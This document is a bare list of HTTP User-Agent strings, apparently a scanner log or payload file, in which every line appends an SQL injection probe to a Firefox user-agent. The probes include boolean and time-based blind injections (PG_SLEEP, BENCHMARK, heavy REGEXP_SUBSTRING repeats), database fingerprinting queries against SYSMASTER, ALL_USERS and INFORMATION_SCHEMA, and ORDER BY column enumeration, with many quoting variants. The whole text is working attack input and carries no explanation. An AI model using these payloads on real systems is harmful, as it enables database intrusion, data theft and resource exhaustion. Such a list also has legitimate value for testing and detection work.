Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS Otfn WHERE 3373=3373 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS RqLV WHERE 5425=5425 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS SrQt WHERE 4152=4152 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS tmRS WHERE 6893=6893 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- JVMN
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ((5896=5896
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ('EFdJ'='EFdJ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND 'VhIx'='VhIx
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND \x22ldRz\x22 LIKE \x22ldRz
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- jVen
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)# CIyX
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 3001=3001 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- FBWE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(73)||CHAR(122)||CHAR(117)||CHAR(78) WHERE 9301=9301 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(97)||CHAR(88)||CHAR(70)||CHAR(80) FROM DUAL WHERE 6099=6099 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS GxxQ WHERE 8378=8378 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- qmnp
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS OKNE WHERE 6897=6897 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- PSdN
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS Yrum WHERE 3084=3084 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- eIFu
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ('dOOD' LIKE 'dOOD
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ((('soPo' LIKE 'soPo
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (\x22kGzd\x22 LIKE \x22kGzd
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- cIht
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(117)||CHAR(75)||CHAR(79)||CHAR(110) WHERE 1719=1719 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(90)||CHAR(87)||CHAR(81)||CHAR(102) FROM DUAL WHERE 4200=4200 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 8535=8535 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- HVxu
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 7373=7373 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT CHAR(76)||CHAR(104)||CHAR(69)||CHAR(106) WHERE 6038=6038 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- eYBq
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (((5193=5193
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((('puSC'='puSC
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'aIlH'='aIlH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17%' AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'FOox%'='FOox
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND \x22CMto\x22=\x22CMto
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 5379=5379 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- KQnL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS iCsX WHERE 8899=8899 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- QLvJ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ('ISuI'='ISuI
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'uZEx'='uZEx
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (('dXEh' LIKE 'dXEh
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17%' OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'Pvhb%'='Pvhb
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (\x22ppmv\x22=\x22ppmv
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 5767=5767 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- HYBR
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT BJlZ WHERE 6897=6897 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 9856=9856 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- MbsK
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 5615=5615 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 1047=1047 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 3093=3093 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 7943=7943 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 6794=6794 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND ('eRPI' LIKE 'eRPI
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND (('CIvN' LIKE 'CIvN
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND \x22YVrd\x22 LIKE \x22YVrd
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) OR 'Mafx'='shAr
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS ZXrW WHERE 8490=8490 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- mazS
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND (('YlLW' LIKE 'YlLW
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')))(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND ((('FgkR' LIKE 'FgkR
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)))(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND (((\x22zDGA\x22=\x22zDGA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)# YeVv
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 7447=7447 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- exTI
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 9006=9006 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- sNxJ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(78)||CHAR(77)||CHAR(113)||CHAR(67) WHERE 1425=1425 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT CHAR(81)||CHAR(75)||CHAR(115)||CHAR(74) WHERE 8139=8139 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS rAfx WHERE 9578=9578 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- yewd
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- FfKy
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- PAaV
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')))(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND ((('KGjj'='KGjj
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT DfMA WHERE 5903=5903 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS zNbZ WHERE 1110=1110 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- pPFr
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17,(SELECT (CASE WHEN (4469=4469) THEN (SELECT 4469 FROM PG_SLEEP(32)) ELSE 1/(SELECT 0) END))
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17,(SELECT (CASE WHEN (8168=8168) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17',(SELECT (CASE WHEN (8823=8823) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8823),0),3200000000),NULL))) ELSE 8823/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17,(SELECT (CASE WHEN (3508=3508) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))) ELSE 3508/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 1-- wVao
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) ORDER BY 8259-- FbRR
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) ORDER BY 1-- EBnP
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17%' ORDER BY 1-- Oyha
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) ORDER BY 3124-- FonE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) ORDER BY 1-- mYUH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) ORDER BY 1-- Cuoq
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) ORDER BY 1-- dLNr
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) ORDER BY 1-- xNoB
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 ORDER BY 1-- Pixk
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 ORDER BY 1-- Hujb
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS KOPz WHERE 3054=3054 ORDER BY 6979-- uDAW
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) ORDER BY 5624#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) ORDER BY 7424#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') ORDER BY 8684#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS JZSo WHERE 5182=5182 ORDER BY 4180#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) ORDER BY 9871#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT DzWb WHERE 6882=6882 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT YuiB WHERE 7756=7756 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT oiMJ WHERE 2609=2609 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS EuUD WHERE 1764=1764 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS Bgyv WHERE 7190=7190 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS EJVG WHERE 6155=6155 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
